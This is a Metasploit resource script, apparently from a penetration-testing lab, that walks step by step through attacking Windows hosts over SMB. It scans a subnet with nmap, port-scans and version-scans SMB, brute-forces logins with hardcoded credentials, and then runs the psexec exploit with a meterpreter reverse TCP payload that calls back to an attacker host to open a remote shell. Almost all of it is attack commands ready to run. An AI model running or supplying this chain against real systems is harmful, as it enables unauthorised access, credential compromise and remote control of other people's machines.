# Windows SMB Attack scan, exploit and payload to get a reverse shell on target machine using credentials

# connect to msf database
db_status

# set or edit global options to save time with further scans, exploits and payloads
# remember to unset these global options when you have completed this pentest
setg RHOSTS 172.22.117.0/24
setg RHOST 172.22.117.20
save

# nmap scan to save hosts in database
db_nmap -A 172.22.117.0/24

# tcp port scan for smb port 445
use auxiliary/scanner/portscan/tcp
hosts -R
# set or edit PORTS module options here
set PORTS 445
run

# smb version scanner
use auxiliary/scanner/smb/smb_version
hosts -R
# set or edit THREADS module options here
set THREADS 11
run

# smb login scanner to brute force credentials 
use auxiliary/scanner/smb/smb_login
hosts -R
# set or edit SMBUser SMBPass SMBDomain and THREADS module options here
set SMBUser tstark
set SMBPass Password!
set THREADS 50
set SMBDomain megacorpone
run

# smb PsExec exploit with meterpreter reverse TCP payload to get meterpreter session on target machine
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
# set or edit LHOST LPORT RHOSTS SMBDomain SMBUser SMBPass module options here
set LHOST 172.22.117.100
set LPORT 443
set RHOSTS 172.22.117.20
set SMBDomain megacorpone
set SMBUser tstark
set SMBpass Password!
exploit
